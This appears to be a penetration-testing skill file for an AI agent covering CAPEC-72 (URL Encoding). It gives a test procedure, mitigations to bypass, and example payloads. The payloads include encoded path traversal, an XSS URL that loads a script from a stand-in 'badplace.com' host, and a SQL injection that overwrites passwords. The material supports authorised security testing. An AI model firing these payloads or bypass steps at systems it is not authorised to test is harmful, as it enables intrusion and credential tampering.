# CAPEC-72: URL Encoding

- Catalog: [CAPEC-72](https://capec.mitre.org/data/definitions/72.html)
- Abstraction: Detailed · Status: Draft
- Likelihood of attack: High · Typical severity: High
- CAPEC list: 3.9

## Attack pattern

This attack targets the encoding of the URL. An adversary can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL.

## Exhaustive test law

This is a detailed pattern. Execute every listed technique in the execution flow, then mutate encodings/roles/verbs. Also run the parent Standard/Meta patterns.

A scanner hit or a single blocked request is inventory, not a CAPEC-72 test. Complete means every in-scope instance finished the execution flow (or was ruled out with saved evidence) **and** every related CWE procedure was run or dated N/A.

## Tooling (PWN)

skills_recall capec → read references/CAPEC-<id>.md; then skills_recall cwe for each related CWE; pwn_eval / BurpSuite / TransparentBrowser / SAST as the surface requires

## Procedure

1. **Applicability gate.** Check prerequisites and skills below. If the target cannot satisfy them, record `CAPEC-72 N/A: <reason>` and stop.
2. **Instance inventory.** List every actor/path/API/host where this pattern can run (anonymous, low-priv, high-priv, adjacent network, local). One URL is not an inventory.
3. **Oracle.** From consequences, define pass/fail (auth bypass, data out, crash, persistence, etc.).
4. **Execute the flow.** Run every Explore → Experiment → Exploit step and every listed technique. Persist request/response, pcap, or debugger output under `/tmp` or the engagement dir and **re-read** it.
5. **Mutate.** Encoding, method, role, content-type, timing, second-order, chained related CAPECs. Do not stop at the first WAF 403.
6. **Mitigation negation.** For each mitigation, retry the flow with the control on and bypassed. Unchanged oracle = control failed.
7. **CWE close-out.** Open each related `cwe` skill file (`../cwe/references/CWE-<id>.md`) and run that exhaustive CWE procedure. CAPEC without CWE is a technique note, not a weakness finding.
8. **Report.** Cite `CAPEC-72`, related CWE IDs, instance, oracle, evidence path.

## Execution flow (minimum techniques)

- Step 1 (Explore): [Survey web application for URLs with parameters] Using a browser, an automated tool or by inspecting the application, an adversary records all URLs that contain parameters. | techniques: Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.
- Step 2 (Experiment): [Probe URLs to locate vulnerabilities] The adversary uses the URLs gathered in the "Explore" phase as a target list and tests parameters with different encodings of special characters to see how the web application will handle them. | techniques: Use URL encodings of special characters such as semi-colons, backslashes, or question marks that might be filtered out normally.; C…
- Step 3 (Exploit): [Inject special characters into URL parameters] Using the information gathered in the "Experiment" phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc.

## Prerequisites

- The application should accepts and decodes URL input.
- The application performs insufficient filtering/canonicalization on the URLs.

## Skills required

- Low: An adversary can try special characters in the URL and bypass the URL validation.
- Medium: The adversary may write a script to defeat the input filtering mechanism.

## Resources required

- (none listed in CAPEC catalog)

## Oracles (consequences)

- Confidentiality: Read Data
- Availability: Resource Consumption — Denial of Service
- Confidentiality, Integrity, Availability: Execute Unauthorized Commands — Run Arbitrary Code
- Confidentiality, Access Control, Authorization: Gain Privileges

## Mitigations to bypass

- Refer to the RFCs to safely decode URL.
- Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.
- There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).
- Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.
- Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.
- Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)
- When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.

## Example instances (payload / topology hints)

- URL Encodings in IceCast MP3 Server. The following type of encoded string has been known traverse directories against the IceCast MP3 server9: http://[targethost]:8000/somefile/%2E%2E/target.mp3 or using "/%25%25/" instead of "/../". The control character ".." can be used by an adversary to escape the document root. See also: CVE-2001-0784
- Cross-Site Scripting URL-Encoded attack: http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTML execution: <script src="http://www.badplace.com/nasty.js"></script> [REF-495]
- SQL Injection Original database query in the example file - "login.asp": SQLQuery = "SELECT preferences FROM logintable WHERE userid='" & Request.QueryString("userid") & "' AND password='" & Request.QueryString("password") & "';" URL-encoded attack: http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 Executed database query: SELECT preferences FROM…
- Combined Encodings CesarFTP Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks. An adversary could provide a URL that included a string like /...%5C/ This is an interesting exploit…

## Related CAPECs (test these too)

- ChildOf → [CAPEC-267](CAPEC-267.md)

## Related CWEs (run the cwe skill)

- [CWE-173](../cwe/references/CWE-173.md) — run that CWE procedure after this CAPEC flow
- [CWE-177](../cwe/references/CWE-177.md) — run that CWE procedure after this CAPEC flow
- [CWE-172](../cwe/references/CWE-172.md) — run that CWE procedure after this CAPEC flow
- [CWE-73](../cwe/references/CWE-73.md) — run that CWE procedure after this CAPEC flow
- [CWE-74](../cwe/references/CWE-74.md) — run that CWE procedure after this CAPEC flow
- [CWE-20](../cwe/references/CWE-20.md) — run that CWE procedure after this CAPEC flow

## Verification

- [ ] Applicability recorded (in-scope or dated N/A)
- [ ] Instance inventory is more than one guess
- [ ] Every execution-flow step was attempted or marked N/A
- [ ] Evidence artifact path saved and re-read
- [ ] Related CAPECs handled or deferred
- [ ] Related CWE procedures run via `cwe` skill
- [ ] Finding (if any) cites CAPEC-72 and CWE IDs
